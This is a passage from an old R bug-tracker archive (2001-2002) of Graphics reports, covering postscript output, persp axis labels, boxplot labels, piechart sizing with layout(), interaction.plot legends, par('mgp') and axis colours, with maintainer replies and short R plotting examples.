	for <r-bugs@r-project.org>; Fri, 26 Oct 2001 15:35:47 -0400
Message-ID: <3BD9B841.215F6DB3@umsanet.edu.bo>
Date: Fri, 26 Oct 2001 15:23:45 -0400
From: kjetil halvorsen <kjetilh@umsanet.edu.bo>
Reply-To: kjetilh@umsanet.edu.bo
Organization: UMSA
X-Mailer: Mozilla 4.7 [en] (Win98; I)
X-Accept-Language: en
MIME-Version: 1.0
To: r-bugs@r-project.org
Subject: postscript problem
Content-Type: text/plain; charset=us-ascii
Content-Transfer-Encoding: 7bit

I reported this earlier, and have got reports that others have the same
promlem on UNIX machines, so it is not only a windows problem
S I file a bug report.

The function (boot.stat) given at the end produces a postscript file, 
which cannot be included correctly in LaTeX. Specifically, 
the image in LaTeX (when translated by dvips to postscript)
becomes very small, not using the bounding box, and turned on its head!

Kjetil Halvorsen

boot.stat <-
function (x, B = 1000, norm = FALSE) 
{
    xname <- deparse(substitute(x))
    means <- meds <- numeric(B)
    for (i in 1:B) {
        s <- sample(x, replace = TRUE)
        means[i] <- mean(s)
        meds[i] <- median(s)
    }
    CImedian <- quantile(meds, c(0.025, 0.5, 0.975))
    CImean <- quantile(means, c(0.025, 0.5, 0.975))
    hmean <- hist(means, freq = FALSE, plot = FALSE)
    hmeds <- hist(meds, freq = FALSE, plot = FALSE)
    split.screen(c(1, 2))
    xlims <- range(c(hmean$breaks, hmeds$breaks))
    ymax <- max(c(hmean$density, hmeds$density))
    screen(1)
    plot(hmean, freq = FALSE, col = "red", xlim = xlims, ylim = c(0, 
        ymax), xlab = paste("Sampling dist. of mean of ", xname), 
        main = "")
    if (norm) {
        n <- length(x)
        mu <- mean(x)
        sd <- sqrt(var(x)/n)
        ps <- seq(xlims[1], xlims[2], len = 100)
        lines(ps, dnorm(ps, mu, sd), col = "darkgreen")
    }
    lines(CImean, rep(ymax/2, 3))
    points(CImean[2], ymax/2, cex = 2, col = "black")
    screen(2)
    plot(hmeds, freq = FALSE, col = "lightblue", xlim = xlims, 
        ylim = c(0, ymax), xlab = paste("Sampling dist. of median of ",
            xname), main = "")
    if (norm) {
        n <- length(x)
        p <- 1/2
        mu <- median(x)
        d <- density(x, n = 1, from = mu, to = mu)$y
        sd <- sqrt(p * (1 - p)/n)/d
        ps <- seq(xlims[1], xlims[2], len = 100)
        lines(ps, dnorm(ps, mu, sd), col = "darkgreen")
    }
    lines(CImedian, rep(ymax/2, 3))
    points(CImedian[2], ymax/2, cex = 2, col = "black")
    names(B) <- "Number of bootstrap replicactions"
    invisible(list(CImean = CImean, CImedian = CImedian, B, means =
means, 
        meds = meds))
}


call with for example

boot.stat( rnorm(100), norm=TRUE)

==> 1147.audit <==
Wed Oct 31 15:17:18 2001	ripley	changed notes
Wed Oct 31 15:17:18 2001	ripley	foobar
Wed Oct 31 15:17:18 2001	ripley	moved from incoming to Graphics

==> 1147.followup.1 <==
From postmaster@franz.stat.wisc.edu Thu Feb  7 16:39:12 2002
Received: from franz.stat.wisc.edu (root@franz.stat.wisc.edu [128.105.174.95])
	by pubhealth.ku.dk (8.9.3/8.9.1) with ESMTP id QAA05430
	for <r-bugs@biostat.ku.dk>; Thu, 7 Feb 2002 16:39:09 +0100 (MET)
Received: from jupiter.umsanet.edu.bo (really [166.114.17.11]) by franz.stat.wisc.edu
	via smail with esmtp
	id <m16YqdA-000IbFC@franz.stat.wisc.edu> (Debian Smail3.2.0.114)
	for <r-bugs@r-project.org>; Thu, 7 Feb 2002 09:38:36 -0600 (CST) 
Received: from umsanet.edu.bo (antiguo31.umsanet.edu.bo [192.168.14.31])
	by jupiter.umsanet.edu.bo (8.11.0/8.9.3) with ESMTP id g17FqWW23666
	for <r-bugs@r-project.org>; Thu, 7 Feb 2002 11:52:33 -0400
Message-ID: <3C629F2F.71DBBE02@umsanet.edu.bo>
Date: Thu, 07 Feb 2002 11:37:19 -0400
From: kjetil halvorsen <kjetilh@umsanet.edu.bo>
Reply-To: kjetilh@umsanet.edu.bo
Organization: UMSA
X-Mailer: Mozilla 4.7 [en] (Win98; I)
X-Accept-Language: en
MIME-Version: 1.0
To: r-bugs@r-project.org
Subject: PR# 1147
Content-Type: text/plain; charset=us-ascii
Content-Transfer-Encoding: 7bit
Content-Length: 328
Status: RO

Apropops todays automatic bug report: The bug #1147 I reported
(postscript, problems with screen layout) which I treported some time
ago, does not anymore occur R1.4.0, windows 98, when I test with the
same code that caused the original problem. Fixed as a by-product of the
internal changes to graphics code?

Kjetil Halvorsen

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
* PR# 1161 *
Subject: x-axis label in persp()
From: Rolf Turner <rolf@maths.uwa.edu.au>
Date: Wed, 7 Nov 2001 18:07:22 +0800 (WST)
-- no notes --
~~~~~~~~~~ original reports follow ~~~~~~~~~~
==> 1161 <==
From postmaster@franz.stat.wisc.edu  Wed Nov  7 11:07:32 2001
Received: from franz.stat.wisc.edu (root@franz.stat.wisc.edu [128.105.174.95])
	by pubhealth.ku.dk (8.9.3/8.9.1) with ESMTP id LAA22526
	for <r-bugs@biostat.ku.dk>; Wed, 7 Nov 2001 11:07:32 +0100 (MET)
Received: from madvax.maths.uwa.edu.au (really [130.95.16.1]) by franz.stat.wisc.edu
	via smail with esmtp
	id <m161PcE-000JLZC@franz.stat.wisc.edu> (Debian Smail3.2.0.114)
	for <r-bugs@r-project.org>; Wed, 7 Nov 2001 04:07:26 -0600 (CST) 
Received: from salvia.maths.uwa.edu.au (salvia.maths.uwa.edu.au [130.95.16.72])
	by madvax.maths.uwa.edu.au (8.12.0/8.12.0) with ESMTP id fA7A7M7Z209411
	for <r-bugs@r-project.org>; Wed, 7 Nov 2001 18:07:23 +0800 (WST)
From: Rolf Turner <rolf@maths.uwa.edu.au>
Date: Wed, 7 Nov 2001 18:07:22 +0800 (WST)
Message-Id: <200111071007.SAA21120@salvia.maths.uwa.edu.au>
To: r-bugs@r-project.org
Subject: x-axis label in persp()


If the surface to be plotted by persp() is supplied as
a list, the x-axis label defaults to the name, in the call,
of this list --- which is usually silly.

I would suggest changing the first four lines of
persp.default() (where the x-axis label gets set) from

if (is.null(xlab))
        xlab <- if (!missing(x))
            deparse(substitute(x))
        else "X"

to

if (is.null(xlab))
        xlab <- if (!missing(x) && !is.list(x) && !is.matrix(x))
            deparse(substitute(x))
        else "X"

which makes the x-axis label default to "X" if the surface
is specified as a list.


					cheers,

						Rolf Turner

Current email address: rolf@maths.uwa.edu.au
Usual email address:   rolf@math.unb.ca

==> 1161.audit <==
Sun Nov 11 17:22:03 2001	ripley	moved from incoming to Graphics
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
* PR# 1207 *
Subject: boxplot labels incorrect when horizontal = TRUE
From: Rashid Nassar <rnassar@duke.edu>
Date: Sun, 9 Dec 2001 21:46:32 -0500 (EST)
-- no notes --
~~~~~~~~~~ original reports follow ~~~~~~~~~~
==> 1207 <==
From rnassar@duke.edu  Mon Dec 10 03:47:18 2001
Received: from gibson.acpub.duke.edu (gibson.acpub.duke.edu [152.3.233.8])
	by pubhealth.ku.dk (8.9.3/8.9.1) with ESMTP id DAA19748
	for <r-bugs@biostat.ku.dk>; Mon, 10 Dec 2001 03:47:17 +0100 (MET)
Received: from godzilla5.acpub.duke.edu (rnassar@godzilla5.acpub.duke.edu [152.3.233.46]) 
        by gibson.acpub.duke.edu (8.11.5/8.11.3/Duke-5.0.0) with ESMTP id fBA2kYR03236 for <r-bugs@biostat.ku.dk>;
        Sun, 9 Dec 2001 21:46:34 -0500 (EST)
Received: (from rnassar@localhost)
	by godzilla5.acpub.duke.edu (8.9.3/8.9.3) id VAA28884;
	Sun, 9 Dec 2001 21:46:33 -0500 (EST)
Date: Sun, 9 Dec 2001 21:46:32 -0500 (EST)
From: Rashid Nassar <rnassar@duke.edu>
X-Sender: rnassar@godzilla5.acpub.duke.edu
To: r-bugs <r-bugs@biostat.ku.dk>
Subject: boxplot labels incorrect when horizontal = TRUE
Message-ID: <Pine.SOL.3.91.1011209214428.28790B-100000@godzilla5.acpub.duke.edu>
MIME-Version: 1.0
Content-Type: TEXT/PLAIN; charset=US-ASCII
X-Virus-Scanned: by amavisd-milter, Duke University (http://amavis.org/)

#Example:

y <- rnorm(10)
group <- gl(2,5)

plot(y ~ group, horizontal = TRUE)  # BUG: default xlab & ylab interchanged
plot(y ~ group, horizontal = FALSE) # OK: supplies correct default xlab & ylab


# Using boxplot() instead of plot() omits default axis labels altogether
# (not sure if this is intentional):

boxplot(y ~ group, horizontal = FALSE) # no default axis labels supplied
boxplot(y ~ group, horizontal = TRUE)  # no default axis labels supplied

Thank you!

Rashid Nassar


--please do not edit the information below--

Version:
 platform = i586-pc-linux-gnu
 arch = i586
 os = linux-gnu
 system = i586, linux-gnu
 status = 
 major = 1
 minor = 3.1
 year = 2001
 month = 08
 day = 31
 language = R

Search Path:
 .GlobalEnv, Shoes, package:nls, package:nlme, package:ctest, Autoloads, 
package:base


==> 1207.audit <==
Mon Dec 10 08:21:15 2001	ripley	foobar
Mon Dec 10 08:21:15 2001	ripley	moved from incoming to Graphics

==> 1207.followup.1 <==
From ripley@stats.ox.ac.uk  Mon Dec 10 08:41:33 2001
Received: from toucan.stats.ox.ac.uk (toucan.stats.ox.ac.uk [163.1.20.20])
	by pubhealth.ku.dk (8.9.3/8.9.1) with ESMTP id IAA20814
	for <R-bugs@biostat.ku.dk>; Mon, 10 Dec 2001 08:41:32 +0100 (MET)
Received: from gannet.stats (IDENT:root@gannet.stats [163.1.20.127])
	by toucan.stats.ox.ac.uk (8.9.0/8.9.0) with ESMTP id HAA10031;
	Mon, 10 Dec 2001 07:41:26 GMT
Received: from localhost (ripley@localhost)
	by gannet.stats (8.11.3/8.11.3) with ESMTP id fBA7fQZ09146;
	Mon, 10 Dec 2001 07:41:26 GMT
X-Authentication-Warning: gannet.stats: ripley owned process doing -bs
Date: Mon, 10 Dec 2001 07:41:26 +0000 (GMT)
From: Prof Brian Ripley <ripley@stats.ox.ac.uk>
X-X-Sender:  <ripley@gannet.stats>
To: <rnassar@duke.edu>
cc: <R-bugs@biostat.ku.dk>
Subject: Re: [Rd] boxplot labels incorrect when horizontal = TRUE (PR#1207)
In-Reply-To: <200112100247.DAA19758@pubhealth.ku.dk>
Message-ID: <Pine.LNX.4.31.0112100733010.9079-100000@gannet.stats>
MIME-Version: 1.0
Content-Type: TEXT/PLAIN; charset=US-ASCII

On Mon, 10 Dec 2001 rnassar@duke.edu wrote:

> #Example:
>
> y <- rnorm(10)
> group <- gl(2,5)
>
> plot(y ~ group, horizontal = TRUE)  # BUG: default xlab & ylab interchanged
> plot(y ~ group, horizontal = FALSE) # OK: supplies correct default xlab & ylab

Um.  That's plot.formula, not boxplot.  horizontal = TRUE is *not* a
documented argument to plot.formula.  If you pass arguments to boxplot
through ... (rather than just par values), you may well get unexpected
results.

To fix this needs plot.formula to recognize horizontal, and that's
an API change which I don't advocate during feature freeze.
Generally, not doing something which is not documented to happen is not a
bug, so I'll put this on the wishlist.

> # Using boxplot() instead of plot() omits default axis labels altogether
> # (not sure if this is intentional):
>
> boxplot(y ~ group, horizontal = FALSE) # no default axis labels supplied
> boxplot(y ~ group, horizontal = TRUE)  # no default axis labels supplied

Yes, it's intentional.  You can always use title().


-- 
Brian D. Ripley,                  ripley@stats.ox.ac.uk
Professor of Applied Statistics,  http://www.stats.ox.ac.uk/~ripley/
University of Oxford,             Tel:  +44 1865 272861 (self)
1 South Parks Road,                     +44 1865 272860 (secr)
Oxford OX1 3TG, UK                Fax:  +44 1865 272595

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
* PR# 1235 *
Subject: Axes labelling with logarithmic scales
From: tobias.hoevekamp@ilw.agrl.ethz.ch
Date: Thu, 3 Jan 2002 15:29:02 +0100 (MET)
-- no notes --
~~~~~~~~~~ original reports follow ~~~~~~~~~~
==> 1235 <==
From tobias.hoevekamp@ilw.agrl.ethz.ch  Thu Jan  3 15:29:03 2002
Received: from blueberry.kubism.ku.dk (blueberry [130.225.108.193])
	by pubhealth.ku.dk (8.9.3/8.9.1) with ESMTP id PAA25589
	for <R-bugs@biostat.ku.dk>; Thu, 3 Jan 2002 15:29:02 +0100 (MET)
Date: Thu, 3 Jan 2002 15:29:02 +0100 (MET)
From: tobias.hoevekamp@ilw.agrl.ethz.ch
Message-Id: <200201031429.PAA25589@pubhealth.ku.dk>
To: R-bugs@biostat.ku.dk
Subject: Axes labelling with logarithmic scales

Full_Name: Tobias Hoevekamp
Version: 1.4.0
OS: Debian GNU/Linux
Submission from: (NULL) (129.132.139.109)


There seems to be a problem with the labelling of axes when
logarithmic scales are used. More than half of 
both axes are not labeled in the following example:


x <-  c(0.12,  0.3,   0.53,  1.1,   1.8,  2.6, 4.5)
y <-  c(0.012, 0.021, 0.032, 0.055, 0.1,  0.2, 0.35)

plot(x, y,
     log="xy",
     main="Problem with axes labelling on logarithmic scales",
     xlab="x, why aren't 0.5, or even smaller tic-values displyed?",
     ylab="y, why isn't 0.05 diplayed?")


==> 1235.audit <==
Mon Jan  7 10:33:27 2002	ripley	foobar
Mon Jan  7 10:33:27 2002	ripley	moved from incoming to Graphics
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
* PR# 1300 *
Subject: FW: layout and piechart diameter problem
From: "Warnes, Gregory R" <gregory_r_warnes@groton.pfizer.com>
Date: Thu, 7 Feb 2002 11:05:15 -0500 
-- no notes --
~~~~~~~~~~ original reports follow ~~~~~~~~~~
==> 1300 <==
From gregory_r_warnes@groton.pfizer.com Thu Feb  7 17:06:56 2002
Received: from mailrelay1.pfizer.com (ns2.pfizer.com [192.77.198.2])
	by pubhealth.ku.dk (8.9.3/8.9.1) with ESMTP id RAA05738
	for <r-bugs@biostat.ku.dk>; Thu, 7 Feb 2002 17:06:55 +0100 (MET)
Received: from gsun56.pfizer.com (localhost [127.0.0.1])
	by mailrelay1.pfizer.com (8.9.3/Pro-8.9.3) with ESMTP id LAA25035
	for <r-bugs@biostat.ku.dk>; Thu, 7 Feb 2002 11:05:53 -0500 (EST)
Received: from groexms02.pfizer.com (localhost [127.0.0.1])
	by gsun56.pfizer.com (Pro-8.9.3/Pro-8.9.3) with ESMTP id LAA08185
	for <r-bugs@biostat.ku.dk>; Thu, 7 Feb 2002 11:07:32 -0500 (EST)
Received: from groexcncr01.pfizer.com (unverified) by groexms02.pfizer.com
 (Content Technologies SMTPRS 4.2.1) with ESMTP id <T58ecad88b1ac1e08e42e9@groexms02.pfizer.com> for <r-bugs@biostat.ku.dk>;
 Thu, 7 Feb 2002 11:05:17 -0500
Received: by groexcncr01.pfizer.com with Internet Mail Service (5.5.2654.89)
	id <1KVC00AM>; Thu, 7 Feb 2002 11:05:17 -0500
Message-ID: <5429125E11E4D411AF7300805FE603A8040DE623@groexmbcr02.pfizer.com>
From: "Warnes, Gregory R" <gregory_r_warnes@groton.pfizer.com>
To: "'R-bugs'" <r-bugs@biostat.ku.dk>
Subject: FW: layout and piechart diameter problem
Date: Thu, 7 Feb 2002 11:05:15 -0500 
MIME-Version: 1.0
X-Mailer: Internet Mail Service (5.5.2654.89)
Content-Type: text/plain; charset="windows-1252"
Content-Length: 2315
Status: R


Third try...

>  -----Original Message-----
> From: 	Warnes, Gregory R  
> Sent:	Tuesday, February 05, 2002 4:12 PM
> To:	'R-bugs'
> Subject:	layout and piechart diameter problem
> 
> 
> I've been using layout to create some graphics pages which include pie
> charts.   (NB: No piechart arguments please, the main chart on the page is
> a proper bar chart representing the same information.)
> 
> When I plot pie charts in a column, the piechart at the top of a column is
> always smaller than the others:  
> 
> For example:
> 
> 	layout( matrix(c(1,1,2,
>                        1,1,3,
>                        1,1,4), ncol=3, byrow=T))
> 	for(i in 1:4) piechart( 1:3 )
> 
> In column 3, the first piechart has a radius something like 2/3 of the
> others.
> 
> This also happens for:
> 
> 	layout( matrix(c(1,2,
>                        1,3,
>                        1,4), ncol=2, byrow=T))
> 	for(i in 1:4) piechart( 1:3 )
> 
> 
> For this: 
> 
> 	layout( matrix(c(1,3,
>                        1,4,
>                        2,5), ncol=2, byrow=T))
> 	for(i in 1:5) piechart( 1:3 )
> 
> the piechart at the bottom left is smaller than the three in the second
> column:
> 
> 
> This occurs both on the x11 and postscript devices, although it is less
> noticeable on the latter.  It doesn't seem happen for 'hist' or 'plot'. As
> I've only recently started using layout, I don't know if this occurs with
> other plotting devices or commands.  
> 
> -Greg
> 
> ------
> 
> > version
>          _                   
> platform sparc-sun-solaris2.8
> arch     sparc               
> os       solaris2.8          
> system   sparc, solaris2.8   
> status                       
> major    1                   
> minor    4.1                 
> year     2002                
> month    01                  
> day      30                  
> language R                   
> 
> 


LEGAL NOTICE
Unless expressly stated otherwise, this message is confidential and may be privileged. It is intended for the addressee(s) only. Access to this E-mail by anyone else is unauthorized. If you are not an addressee, any disclosure or copying of the contents of this E-mail or any action taken (or not taken) in reliance on it is unauthorized and may be unlawful. If you are not an addressee, please inform the sender immediately.


==> 1300.followup.1 <==
From ligges@amadeus.statistik.uni-dortmund.de  Thu Feb  7 22:54:23 2002
Received: from nx5.HRZ.Uni-Dortmund.DE (nx5.HRZ.Uni-Dortmund.DE [129.217.131.21])
	by pubhealth.ku.dk (8.9.3/8.9.1) with ESMTP id WAA07015
	for <R-bugs@biostat.ku.dk>; Thu, 7 Feb 2002 22:54:23 +0100 (MET)
Received: from amadeus.statistik.uni-dortmund.de by nx5.HRZ.Uni-Dortmund.DE
          via smtp-local with ESMTP; Thu, 7 Feb 2002 22:53:27 +0100
Received: from statistik.uni-dortmund.de (dial-142015.HRZ.Uni-Dortmund.DE [129.217.142.15])
	by amadeus.statistik.uni-dortmund.de (8.10.2+Sun/8.10.2) with ESMTP id g17LrPS08216;
	Thu, 7 Feb 2002 22:53:25 +0100 (MET)
Message-ID: <3C62F7A1.8BF78BAC@statistik.uni-dortmund.de>
Date: Thu, 07 Feb 2002 22:54:41 +0100
From: Uwe Ligges <ligges@statistik.uni-dortmund.de>
X-Mailer: Mozilla 4.79 [en] (Windows NT 5.0; U)
X-Accept-Language: en
MIME-Version: 1.0
To: gregory_r_warnes@groton.pfizer.com
CC: R-bugs@biostat.ku.dk
Subject: Re: [Rd] FW: layout and piechart diameter problem (PR#1300)
References: <200202071812.TAA06359@pubhealth.ku.dk>
Content-Type: text/plain; charset=us-ascii
Content-Transfer-Encoding: 7bit

gregory_r_warnes@groton.pfizer.com wrote:
> 
> Third try...
> 
> >  -----Original Message-----
> > From:         Warnes, Gregory R
> > Sent: Tuesday, February 05, 2002 4:12 PM
> > To:   'R-bugs'
> > Subject:      layout and piechart diameter problem
> >
> >
> > I've been using layout to create some graphics pages which include pie
> > charts.   (NB: No piechart arguments please, the main chart on the page is
> > a proper bar chart representing the same information.)
> >
> > When I plot pie charts in a column, the piechart at the top of a column is
> > always smaller than the others:
> >
> > For example:
> >
> >       layout( matrix(c(1,1,2,
> >                        1,1,3,
> >                        1,1,4), ncol=3, byrow=T))
> >       for(i in 1:4) piechart( 1:3 )
> >
> > In column 3, the first piechart has a radius something like 2/3 of the
> > others.
> >
> > This also happens for:
> >
> >       layout( matrix(c(1,2,
> >                        1,3,
> >                        1,4), ncol=2, byrow=T))
> >       for(i in 1:4) piechart( 1:3 )
> >
> >
> > For this:
> >
> >       layout( matrix(c(1,3,
> >                        1,4,
> >                        2,5), ncol=2, byrow=T))
> >       for(i in 1:5) piechart( 1:3 )
> >
> > the piechart at the bottom left is smaller than the three in the second
> > column:
> >
> >
> > This occurs both on the x11 and postscript devices, although it is less
> > noticeable on the latter.  It doesn't seem happen for 'hist' or 'plot'. As
> > I've only recently started using layout, I don't know if this occurs with
> > other plotting devices or commands.

Probably only if the functions are making use of par("pin") (and friends
?) as piechart() does:

layout(matrix(c(1,1,2, 1,1,3, 1,1,4), ncol=3, byrow=TRUE))
par("pin")
plot(1); par("pin")  # Here it goes wrong for the next plot.
plot(1); par("pin")
plot(1); par("pin")
plot(1)


Uwe Ligges

==> 1300.followup.2 <==
From ligges@amadeus.statistik.uni-dortmund.de  Thu Feb  7 22:59:11 2002
Received: from nx5.HRZ.Uni-Dortmund.DE (nx5.HRZ.Uni-Dortmund.DE [129.217.131.21])
	by pubhealth.ku.dk (8.9.3/8.9.1) with ESMTP id WAA07044
	for <R-bugs@biostat.ku.dk>; Thu, 7 Feb 2002 22:59:11 +0100 (MET)
Received: from amadeus.statistik.uni-dortmund.de by nx5.HRZ.Uni-Dortmund.DE
          via smtp-local with ESMTP; Thu, 7 Feb 2002 22:58:27 +0100
Received: from statistik.uni-dortmund.de (dial-142015.HRZ.Uni-Dortmund.DE [129.217.142.15])
	by amadeus.statistik.uni-dortmund.de (8.10.2+Sun/8.10.2) with ESMTP id g17LwQS08237;
	Thu, 7 Feb 2002 22:58:26 +0100 (MET)
Message-ID: <3C62F8CE.85E07095@statistik.uni-dortmund.de>
Date: Thu, 07 Feb 2002 22:59:42 +0100
From: Uwe Ligges <ligges@statistik.uni-dortmund.de>
X-Mailer: Mozilla 4.79 [en] (Windows NT 5.0; U)
X-Accept-Language: en
MIME-Version: 1.0
To: gregory_r_warnes@groton.pfizer.com, R-bugs@biostat.ku.dk
Subject: Re: [Rd] FW: layout and piechart diameter problem (PR#1300)
References: <200202071812.TAA06359@pubhealth.ku.dk> <3C62F7A1.8BF78BAC@statistik.uni-dortmund.de>
Content-Type: text/plain; charset=us-ascii
Content-Transfer-Encoding: 7bit



Uwe Ligges wrote:
> 
> gregory_r_warnes@groton.pfizer.com wrote:
> >
> > Third try...
> >
> > >  -----Original Message-----
> > > From:         Warnes, Gregory R
> > > Sent: Tuesday, February 05, 2002 4:12 PM
> > > To:   'R-bugs'
> > > Subject:      layout and piechart diameter problem
> > >
> > >
> > > I've been using layout to create some graphics pages which include pie
> > > charts.   (NB: No piechart arguments please, the main chart on the page is
> > > a proper bar chart representing the same information.)
> > >
> > > When I plot pie charts in a column, the piechart at the top of a column is
> > > always smaller than the others:
> > >
> > > For example:
> > >
> > >       layout( matrix(c(1,1,2,
> > >                        1,1,3,
> > >                        1,1,4), ncol=3, byrow=T))
> > >       for(i in 1:4) piechart( 1:3 )
> > >
> > > In column 3, the first piechart has a radius something like 2/3 of the
> > > others.
> > >
> > > This also happens for:
> > >
> > >       layout( matrix(c(1,2,
> > >                        1,3,
> > >                        1,4), ncol=2, byrow=T))
> > >       for(i in 1:4) piechart( 1:3 )
> > >
> > >
> > > For this:
> > >
> > >       layout( matrix(c(1,3,
> > >                        1,4,
> > >                        2,5), ncol=2, byrow=T))
> > >       for(i in 1:5) piechart( 1:3 )
> > >
> > > the piechart at the bottom left is smaller than the three in the second
> > > column:
> > >
> > >
> > > This occurs both on the x11 and postscript devices, although it is less
> > > noticeable on the latter.  It doesn't seem happen for 'hist' or 'plot'. As
> > > I've only recently started using layout, I don't know if this occurs with
> > > other plotting devices or commands.
> 
> Probably only if the functions are making use of par("pin") (and friends
> ?) as piechart() does:
> 
> layout(matrix(c(1,1,2, 1,1,3, 1,1,4), ncol=3, byrow=TRUE))
> par("pin")
> plot(1); par("pin")  # Here it goes wrong for the next plot.
> plot(1); par("pin")
> plot(1); par("pin")
> plot(1)

And let me add, it is everytime the second one:

layout(matrix(c(1,3, 1,4, 2,5), ncol=2, byrow=TRUE))
for(i in 1:5) piechart( 1:3 )

layout(matrix(c(1,2, 1,4, 3,5), ncol=2, byrow=TRUE))
for(i in 1:5) piechart( 1:3 )

layout(matrix(c(1,3, 1,2, 4,5), ncol=2, byrow=TRUE))
for(i in 1:5) piechart( 1:3 )

Uwe

==> 1300.audit <==
Mon Feb 11 21:37:01 2002	ripley	foobar
Mon Feb 11 21:37:01 2002	ripley	moved from incoming to Graphics
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
* PR# 1305 *
Subject: interaction.plot (with misplaced legend)
From: Uwe Ligges <ligges@statistik.uni-dortmund.de>
Date: Fri, 08 Feb 2002 14:27:01 +0100
-- no notes --
~~~~~~~~~~ original reports follow ~~~~~~~~~~
==> 1305 <==
From ligges@amadeus.statistik.uni-dortmund.de  Fri Feb  8 14:27:13 2002
Received: from nx5.HRZ.Uni-Dortmund.DE (nx5.HRZ.Uni-Dortmund.DE [129.217.131.21])
	by pubhealth.ku.dk (8.9.3/8.9.1) with ESMTP id OAA12321
	for <R-bugs@biostat.ku.dk>; Fri, 8 Feb 2002 14:27:12 +0100 (MET)
Received: from amadeus.statistik.uni-dortmund.de by nx5.HRZ.Uni-Dortmund.DE
          via smtp-local with ESMTP; Fri, 8 Feb 2002 14:26:23 +0100
Received: from statistik.uni-dortmund.de ([129.217.207.201])
	by amadeus.statistik.uni-dortmund.de (8.10.2+Sun/8.10.2) with ESMTP id g18DQMS14563;
	Fri, 8 Feb 2002 14:26:22 +0100 (MET)
Message-ID: <3C63D225.9CA774F@statistik.uni-dortmund.de>
Date: Fri, 08 Feb 2002 14:27:01 +0100
From: Uwe Ligges <ligges@statistik.uni-dortmund.de>
Organization: Fachbereich Statistik, Universitaet Dortmund
X-Mailer: Mozilla 4.79 [en] (WinNT; U)
X-Accept-Language: en
MIME-Version: 1.0
To: Kaiya Liu <liu.262@osu.edu>
CC: r-bugs <R-bugs@biostat.ku.dk>
Subject: interaction.plot (with misplaced legend)
References: <CC1AF68C2B1C644DBC0B6087C3C81BC434FFDF@marge.ies.ad.ltu.se> <5.1.0.14.2.20020207122940.00a02ec0@pop.service.ohio-state.edu>
Content-Type: text/plain; charset=us-ascii
Content-Transfer-Encoding: 7bit

Kaiya Liu wrote:
> 
> Hi,
> 
> I encountered a problem when I did interaction plots using the
> interaction.plot() function. The labels for the trace factor appeared on
> the plot when I did the plots in separate windows, but disappeared/cut off
> when multiple plots were placed in one window. Can anybody help me?

From the example of ?interaction.plot:

 data(ToothGrowth)
 attach(ToothGrowth)
 interaction.plot(dose, supp, len, fixed=TRUE) # OK

But the following looks quite ugly:

 par(mfrow=c(1,2))
 interaction.plot(dose, supp, len, fixed=TRUE)
 interaction.plot(dose, supp, len, fixed=TRUE)

 par(mfrow=c(2,2))
 interaction.plot(dose, supp, len, fixed=TRUE)



There is not only a problem with the legend, also the magnification of
the axis annotation is not homogeneous, because for the x-axis
annotation mtext() is used. I'd suggest to change line 35:
  mtext(xlabs, 1, at = xvals) # old
to
  axis(1, at = xvals, labels = xlabs, ...) # new
   

Uwe Ligges

===============
platform i386-pc-mingw32
arch     x86            
os       Win32          
system   x86, Win32     
status                  
major    1              
minor    4.1            
year     2002           
month    01             
day      30             
language R

==> 1305.audit <==
Mon Feb 11 21:36:26 2002	ripley	moved from incoming to Graphics
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
* PR# 1395 *
Subject: mgp parameter in par()
From: mh.smith@niwa.cri.nz
Date: Tue, 19 Mar 2002 06:11:49 +0100 (MET)
-- no notes --
~~~~~~~~~~ original reports follow ~~~~~~~~~~
==> 1395 <==
From mh.smith@niwa.cri.nz  Tue Mar 19 06:11:51 2002
Received: from blueberry.kubism.ku.dk (blueberry [192.38.19.4])
	by pubhealth.ku.dk (8.9.3/8.9.1) with ESMTP id GAA29491
	for <R-bugs@biostat.ku.dk>; Tue, 19 Mar 2002 06:11:49 +0100 (MET)
Date: Tue, 19 Mar 2002 06:11:49 +0100 (MET)
From: mh.smith@niwa.cri.nz
Message-Id: <200203190511.GAA29491@pubhealth.ku.dk>
To: R-bugs@biostat.ku.dk
Subject: mgp parameter in par()

Full_Name: Murray H Smith
Version: 1.4.1
OS: Windows 2000
Submission from: (NULL) (202.36.29.1)


The mgp parameter in par() does not allow negative values. That is, it does not
allow plots with axes ticks and labels inside the plot. The help document,
Introduction to R, under Graphics: Axes and tick marks, specifically mentions
negative values for mgp as a way to achieve internal ticks and labels. 

Code:
> par(mgp=c(-3,-1,0))
Error in par(mgp = c(-3, -1, 0)) : invalid value specified for graphics
parameter "mgp"

> par(mgp=c(3,-1,0))
Error in par(mgp = c(3, -1, 0)) : invalid value specified for graphics parameter
"mgp".

> par(mgp=c(3,1,-1))
Error in par(mgp = c(3, 1, -1)) : invalid value specified for graphics parameter
"mgp".

> par(mgp=c(-3,1,0))
Error in par(mgp = c(-3, 1, 0)) : invalid value specified for graphics parameter
"mgp".






==> 1395.audit <==
Wed Mar 20 09:15:03 2002	ripley	moved from incoming to Graphics
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
* PR# 1470 *
Subject: color of axis lines
From: gray@jimmy.harvard.edu
Date: Sat, 20 Apr 2002 22:21:44 +0200 (MET DST)
-- no notes --
~~~~~~~~~~ original reports follow ~~~~~~~~~~
==> 1470 <==
From gray@jimmy.harvard.edu  Sat Apr 20 22:21:45 2002
Received: from blueberry.kubism.ku.dk (blueberry [192.38.19.4])
	by pubhealth.ku.dk (8.9.3/8.9.1) with ESMTP id WAA19314
	for <R-bugs@biostat.ku.dk>; Sat, 20 Apr 2002 22:21:44 +0200 (MET DST)
Date: Sat, 20 Apr 2002 22:21:44 +0200 (MET DST)
From: gray@jimmy.harvard.edu
Message-Id: <200204202021.WAA19314@pubhealth.ku.dk>
To: R-bugs@biostat.ku.dk
Subject: color of axis lines

Full_Name: Robert Gray
Version: 1.4.1
OS: Windows NT 4.0
Submission from: (NULL) (155.52.45.116)


I can't seem to get axis tick marks in any color except black (I want to make
plots for a slide presentation using a dark background.)  Below is a simple
example.  I have tried this using postscript in the Windows version of R 1.4.1
and a version of R 1.4.0 compiled on a Sun-Solaris system.  Also, the same
problem occurs in the win.metafile driver.

u1 <- runif(10)
u2 <- runif(10)
